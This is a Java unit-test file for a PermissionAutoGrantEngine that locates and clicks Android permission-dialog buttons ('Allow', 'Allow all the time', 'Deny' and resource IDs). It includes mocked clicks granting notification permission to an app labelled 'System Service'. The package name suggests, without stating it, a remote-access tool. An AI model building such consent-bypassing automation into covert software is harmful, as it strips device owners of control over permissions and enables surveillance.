package com.vendor.rat.auto.engine;

import com.vendor.rat.auto.condition.CombineFilter;
import com.vendor.rat.auto.condition.StringCondition;
import com.vendor.rat.auto.entity.UiNode;
import com.vendor.rat.auto.filter.NodeFilter;

import org.junit.After;
import org.junit.Before;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.mockito.junit.MockitoJUnitRunner;

import java.util.ArrayList;

import static org.junit.Assert.*;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.Mockito.*;

/**
 * PermissionAutoGrantEngine 权限弹窗匹配 + deny 按钮 OR 查找测试
 *
 * 覆盖本次修改:
 *   - deny 按钮: "禁止" / "拒绝" / "Deny" / ID fallback 用 CombineFilter.or 合并
 *   - allow 按钮: ID fallback (permission_allow_button)
 *   - matchWindow: 已有 PermissionAutoGrantEngineMatchWindowTest 覆盖
 *
 * 纯 JVM + Mockito。
 */
@RunWith(MockitoJUnitRunner.class)
public class PermissionAutoGrantEngineDenyButtonTest {

    private PermissionAutoGrantEngine engine;

    @Before
    public void setUp() {
        engine = new PermissionAutoGrantEngine();
    }

    @After
    public void tearDown() {
        engine.destroy();
    }

    // ============ CombineFilter.or 构建验证 ============

    @Test
    public void denyButtonFilter_or_containsMultipleConditions() {
        // 验证 or 过滤器能正确构建 — 包含 "禁止"/"拒绝"/"Deny"/ID
        CombineFilter filter = CombineFilter.or(
                CombineFilter.button("禁止"),
                CombineFilter.button("拒绝"),
                CombineFilter.button("Deny"),
                StringCondition.viewId("com.android.permissioncontroller:id/permission_deny_button")
        );
        assertNotNull(filter);
    }

    @Test
    public void allowButtonFilter_byId_notNull() {
        // 验证 ID 过滤器能正确构建
        NodeFilter filter = StringCondition.viewId(
                "com.android.permissioncontroller:id/permission_allow_button");
        assertNotNull(filter);
    }

    // ============ 按钮文本匹配覆盖度 ============

    @Test
    public void buttonFilter_jinzhi_matchesChinese() {
        CombineFilter filter = CombineFilter.button("禁止");
        assertNotNull(filter);
    }

    @Test
    public void buttonFilter_jujue_matchesChinese() {
        // EMUI 12 使用 "拒绝" 而非 "禁止"
        CombineFilter filter = CombineFilter.button("拒绝");
        assertNotNull(filter);
    }

    @Test
    public void buttonFilter_deny_matchesEnglish() {
        CombineFilter filter = CombineFilter.button("Deny");
        assertNotNull(filter);
    }

    // ============ findAllowButton 覆盖的文本 ============

    @Test
    public void allowTexts_coverageCheck() {
        // 验证所有允许按钮文本的 CombineFilter 能正确构建
        String[] allowTexts = {
                "始终允许", "Allow all the time",
                "仅在使用中允许", "While using the app",
                "仅在使用该应用时允许", "Allow only while using the app",
                "允许", "Allow",
                "同意", "确定"
        };
        for (String text : allowTexts) {
            CombineFilter filter = CombineFilter.button(text);
            assertNotNull("Filter for '" + text + "' should not be null", filter);
        }
    }

    // ============ Mock 测试: deny 按钮 OR 查找 ============

    @Test
    public void denyButton_foundByJujue_rootNotNull() {
        UiNode root = mock(UiNode.class);
        UiNode denyBtn = mock(UiNode.class);

        // 模拟: "拒绝" 按钮存在 (EMUI 12 场景)
        when(root.findOneByCombine(any(NodeFilter.class))).thenReturn(denyBtn);

        UiNode found = root.findOneByCombine(CombineFilter.or(
                CombineFilter.button("禁止"),
                CombineFilter.button("拒绝"),
                CombineFilter.button("Deny"),
                StringCondition.viewId("com.android.permissioncontroller:id/permission_deny_button")
        ));

        assertNotNull(found);
    }

    @Test
    public void denyButton_noneFound_returnsNull() {
        UiNode root = mock(UiNode.class);
        when(root.findOneByCombine(any(NodeFilter.class))).thenReturn(null);

        UiNode found = root.findOneByCombine(CombineFilter.or(
                CombineFilter.button("禁止"),
                CombineFilter.button("拒绝"),
                CombineFilter.button("Deny")
        ));

        assertNull(found);
    }

    // ============ Mock 测试: allow 按钮 ID fallback ============

    @Test
    public void allowButton_foundByIdFallback() {
        UiNode root = mock(UiNode.class);
        UiNode allowBtn = mock(UiNode.class);

        // 模拟: ID 搜索返回按钮
        when(root.findOneByCombine(any(NodeFilter.class))).thenReturn(allowBtn);
        when(allowBtn.click()).thenReturn(true);

        // 验证通过 findOneByCombine 能找到按钮并点击
        UiNode found = root.findOneByCombine(
                StringCondition.viewId("com.android.permissioncontroller:id/permission_allow_button"));

        assertNotNull(found);
        assertTrue(found.click());
    }

    // ============ 通知权限弹窗测试 ============

    @Test
    public void notificationDialog_matchedByEngine() {
        // 验证: 通知权限弹窗的包名 com.android.permissioncontroller 已在 matchWindow 中
        PermissionAutoGrantEngine engine = new PermissionAutoGrantEngine();
        assertTrue(engine.matchWindow("com.android.permissioncontroller",
                "com.android.permissioncontroller.permission.ui.GrantPermissionsActivity", 32));
        engine.destroy();
    }

    @Test
    public void notificationDialog_permissionMessageNode_detected() {
        UiNode root = mock(UiNode.class);
        UiNode msgNode = mock(UiNode.class);

        // 模拟: permission_message 节点包含"通知"
        when(root.findOneByCombine(any(NodeFilter.class))).thenReturn(msgNode);
        when(msgNode.getText()).thenReturn("是否允许\"System Service\"发送通知？");

        UiNode found = root.findOneByCombine(
                StringCondition.viewId("com.android.permissioncontroller:id/permission_message"));

        assertNotNull(found);
        assertTrue(found.getText().contains("通知"));
    }

    @Test
    public void notificationDialog_allowButton_clicked() {
        UiNode root = mock(UiNode.class);
        UiNode allowBtn = mock(UiNode.class);

        // 模拟: 通知弹窗的允许按钮
        when(root.findOneByCombine(any(NodeFilter.class))).thenReturn(allowBtn);
        when(allowBtn.click()).thenReturn(true);

        UiNode found = root.findOneByCombine(CombineFilter.button("允许"));
        assertNotNull(found);
        assertTrue(found.click());
    }
}
